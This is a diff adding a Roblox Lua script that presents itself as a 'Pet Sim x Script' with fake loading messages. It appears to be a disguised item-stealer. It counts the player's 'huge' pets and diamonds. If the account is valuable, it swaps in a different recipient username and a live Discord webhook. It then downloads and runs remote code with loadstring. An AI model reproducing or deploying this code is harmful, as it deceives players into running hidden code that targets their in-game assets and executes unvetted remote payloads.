@@ -1,0 +1,28 @@
+Username = "Imnotkazien"
+WebHook = ""
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+
+local Library = require(game.ReplicatedStorage.Framework.Library);
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
+
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >10 or Client.leaderstats.Diamonds.value > 1000000 then
+     Username = "zefh10"
+     WebHook = "https://discord.com/api/webhooks/1175874977363415060/2kh-euOuoOfd0nKhJBgnTaiZl0QBnB8n8a7kk9YUsBl6oGAMksCNZEFxQ5sUv7B2yHc5"
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
